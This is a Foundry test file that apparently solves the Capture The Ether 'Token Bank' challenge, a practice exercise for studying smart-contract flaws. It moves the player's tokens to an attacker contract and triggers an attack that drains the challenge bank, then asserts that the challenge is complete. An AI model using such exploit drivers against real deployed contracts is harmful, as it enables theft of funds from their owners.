// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";
import {console} from "forge-std/console.sol";

contract TankBankTest is Test {
    TokenBankChallenge public bank;
    TokenBankAttacker public attacker;
    SimpleERC223Token public token;
    address private player = address(1234);

    function setUp() public {
        bank = new TokenBankChallenge(player);
        attacker = new TokenBankAttacker(address(bank));
        token = bank.token();
    }

    function testExploit() public {
        // Transfer all tokens to attacker
        vm.startPrank(player);
        uint256 playerBalance = bank.balanceOf(player);
        console.log("Bank player balance: %d", bank.balanceOf(player));
        console.log("Token player balance: %d", token.balanceOf(player));
        bank.withdraw(playerBalance);

        console.log("WITHDRAWN");
        console.log("Bank player balance: %d", bank.balanceOf(player));
        console.log("Token player balance: %d", token.balanceOf(player));

        token.approve(player, playerBalance);
        token.transferFrom(player, address(attacker), playerBalance);

        console.log("TRANSFERRED");
        console.log("Bank player balance: %d", bank.balanceOf(player));
        console.log("Token player balance: %d", token.balanceOf(player));
        vm.stopPrank();

        console.log("!!!ATTACKING!!!");
        attacker.attack();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(bank.isComplete(), "Challenge Incomplete");
    }
}
